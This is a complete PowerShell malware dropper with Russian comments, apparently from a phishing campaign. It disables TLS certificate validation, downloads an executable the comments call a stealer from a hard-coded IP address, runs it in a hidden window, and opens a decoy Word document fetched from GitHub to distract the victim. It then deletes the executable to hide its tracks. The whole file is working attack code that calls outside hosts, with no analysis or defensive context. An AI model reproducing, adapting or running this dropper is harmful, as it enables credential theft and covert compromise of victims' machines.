# dropper_simple.ps1 - Упрощенная рабочая версия
$sv = "https://92.242.164.31:8443/api/staler.exe"
$gh = "https://raw.githubusercontent.com/DubrovinAlex2005/drop/main/lab5.docx"

# Отключаем SSL
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Скачиваем и запускаем стайлер
$web = New-Object System.Net.WebClient
$web.DownloadFile($sv, "$env:TEMP\_staler.exe")
Start-Process "$env:TEMP\_staler.exe" -WindowStyle Hidden -WorkingDirectory $env:TEMP

# Скачиваем и открываем приманку
$web.DownloadFile($gh, "$env:TEMP\lab5.docx")
Start-Sleep -Seconds 2
Start-Process "$env:TEMP\lab5.docx"

# Очистка через 15 секунд
Start-Sleep -Seconds 15
Remove-Item "$env:TEMP\_staler.exe" -Force -ErrorAction SilentlyContinue
